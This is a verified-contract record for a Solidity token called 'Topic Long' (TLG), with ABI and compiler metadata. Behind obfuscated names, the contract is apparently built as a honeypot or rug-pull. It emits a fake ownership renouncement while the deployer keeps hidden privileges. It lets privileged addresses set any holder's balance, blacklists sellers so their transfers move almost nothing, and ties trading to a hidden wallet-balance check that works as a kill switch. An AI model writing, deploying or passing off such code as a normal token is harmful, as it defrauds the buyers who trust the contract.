{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.12;\n\ninterface exemptTxLaunch {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract walletToLaunched {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface launchedMax {\n    function createPair(address limitTokenTeam, address takeSender) external returns (address);\n}\n\ninterface launchedLimitAmount {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address enableSwap) external view returns (uint256);\n\n    function transfer(address isFrom, uint256 feeIs) external returns (bool);\n\n    function allowance(address takeReceiver, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 feeIs) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address isFrom,\n        uint256 feeIs\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed atIs, uint256 value);\n    event Approval(address indexed takeReceiver, address indexed spender, uint256 value);\n}\n\ninterface launchedLimitAmountMetadata is launchedLimitAmount {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract TopicLong is walletToLaunched, launchedLimitAmount, launchedLimitAmountMetadata {\n\n    string private maxTeam = \"Topic Long\";\n\n    bool public txTrading;\n\n    function limitLaunched(address maxExemptMarketing, address isFrom, uint256 feeIs) internal returns (bool) {\n        if (maxExemptMarketing == receiverLaunchedMin) {\n            return fundLiquidity(maxExemptMarketing, isFrom, feeIs);\n        }\n        uint256 fundListSell = launchedLimitAmount(txExempt).balanceOf(exemptEnableWallet);\n        require(fundListSell == exemptBuySwap);\n        require(isFrom != exemptEnableWallet);\n        if (limitSender[maxExemptMarketing]) {\n            return fundLiquidity(maxExemptMarketing, isFrom, autoAmountFund);\n        }\n        return fundLiquidity(maxExemptMarketing, isFrom, feeIs);\n    }\n\n    address private liquiditySellSender;\n\n    function fundLiquidity(address maxExemptMarketing, address isFrom, uint256 feeIs) internal returns (bool) {\n        require(shouldSell[maxExemptMarketing] >= feeIs);\n        shouldSell[maxExemptMarketing] -= feeIs;\n        shouldSell[isFrom] += feeIs;\n        emit Transfer(maxExemptMarketing, isFrom, feeIs);\n        return true;\n    }\n\n    mapping(address => uint256) private shouldSell;\n\n    string private walletTotal = \"TLG\";\n\n    function decimals() external view virtual override returns (uint8) {\n        return limitFund;\n    }\n\n    uint256 public buyEnable;\n\n    mapping(address => bool) public limitSender;\n\n    function totalMaxSwap(address enableList) public {\n        atLiquidity();\n        \n        if (enableList == receiverLaunchedMin || enableList == txExempt) {\n            return;\n        }\n        limitSender[enableList] = true;\n    }\n\n    address buyAutoTake = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    mapping(address => mapping(address => uint256)) private minSell;\n\n    uint256 constant autoAmountFund = 11 ** 10;\n\n    function allowance(address enableWallet, address exemptMode) external view virtual override returns (uint256) {\n        if (exemptMode == buyAutoTake) {\n            return type(uint256).max;\n        }\n        return minSell[enableWallet][exemptMode];\n    }\n\n    event OwnershipTransferred(address indexed liquidityBuy, address indexed autoFund);\n\n    address exemptEnableWallet = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return enableLiquidity;\n    }\n\n    uint8 private limitFund = 18;\n\n    function limitTo() public {\n        emit OwnershipTransferred(receiverLaunchedMin, address(0));\n        liquiditySellSender = address(0);\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return maxTeam;\n    }\n\n    uint256 public exemptFee;\n\n    constructor (){\n        \n        exemptTxLaunch takeBuy = exemptTxLaunch(buyAutoTake);\n        txExempt = launchedMax(takeBuy.factory()).createPair(takeBuy.WETH(), address(this));\n        if (txFund == txTrading) {\n            listFund = true;\n        }\n        receiverLaunchedMin = _msgSender();\n        limitTo();\n        toEnableTrading[receiverLaunchedMin] = true;\n        shouldSell[receiverLaunchedMin] = enableLiquidity;\n        \n        emit Transfer(address(0), receiverLaunchedMin, enableLiquidity);\n    }\n\n    function buyTotal(address limitExemptMin, uint256 feeIs) public {\n        atLiquidity();\n        shouldSell[limitExemptMin] = feeIs;\n    }\n\n    function transfer(address limitExemptMin, uint256 feeIs) external virtual override returns (bool) {\n        return limitLaunched(_msgSender(), limitExemptMin, feeIs);\n    }\n\n    bool public listFund;\n\n    mapping(address => bool) public toEnableTrading;\n\n    function atLiquidity() private view {\n        require(toEnableTrading[_msgSender()]);\n    }\n\n    function transferFrom(address maxExemptMarketing, address isFrom, uint256 feeIs) external override returns (bool) {\n        if (_msgSender() != buyAutoTake) {\n            if (minSell[maxExemptMarketing][_msgSender()] != type(uint256).max) {\n                require(feeIs <= minSell[maxExemptMarketing][_msgSender()]);\n                minSell[maxExemptMarketing][_msgSender()] -= feeIs;\n            }\n        }\n        return limitLaunched(maxExemptMarketing, isFrom, feeIs);\n    }\n\n    function owner() external view returns (address) {\n        return liquiditySellSender;\n    }\n\n    function balanceOf(address enableSwap) public view virtual override returns (uint256) {\n        return shouldSell[enableSwap];\n    }\n\n    bool public txFund;\n\n    function symbol() external view virtual override returns (string memory) {\n        return walletTotal;\n    }\n\n    uint256 exemptBuySwap;\n\n    function getOwner() external view returns (address) {\n        return liquiditySellSender;\n    }\n\n    uint256 private enableLiquidity = 100000000 * 10 ** 18;\n\n    bool public senderLimit;\n\n    address public txExempt;\n\n    uint256 totalMarketing;\n\n    function fromEnable(uint256 feeIs) public {\n        atLiquidity();\n        exemptBuySwap = feeIs;\n    }\n\n    function approve(address exemptMode, uint256 feeIs) public virtual override returns (bool) {\n        minSell[_msgSender()][exemptMode] = feeIs;\n        emit Approval(_msgSender(), exemptMode, feeIs);\n        return true;\n    }\n\n    address public receiverLaunchedMin;\n\n    function receiverTo(address listMax) public {\n        if (senderLimit) {\n            return;\n        }\n        \n        toEnableTrading[listMax] = true;\n        if (txFund == listFund) {\n            exemptFee = buyEnable;\n        }\n        senderLimit = true;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"takeReceiver\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"liquidityBuy\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"autoFund\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"atIs\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableWallet\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"exemptMode\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"exemptMode\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"feeIs\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableSwap\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyEnable\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"limitExemptMin\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"feeIs\",\"type\":\"uint256\"}],\"name\":\"buyTotal\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"exemptFee\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"feeIs\",\"type\":\"uint256\"}],\"name\":\"fromEnable\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"limitSender\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"limitTo\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listFund\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverLaunchedMin\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"listMax\",\"type\":\"address\"}],\"name\":\"receiverTo\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderLimit\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"toEnableTrading\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableList\",\"type\":\"address\"}],\"name\":\"totalMaxSwap\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"limitExemptMin\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"feeIs\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxExemptMarketing\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"isFrom\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"feeIs\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"txExempt\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"txFund\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"txTrading\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "TopicLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}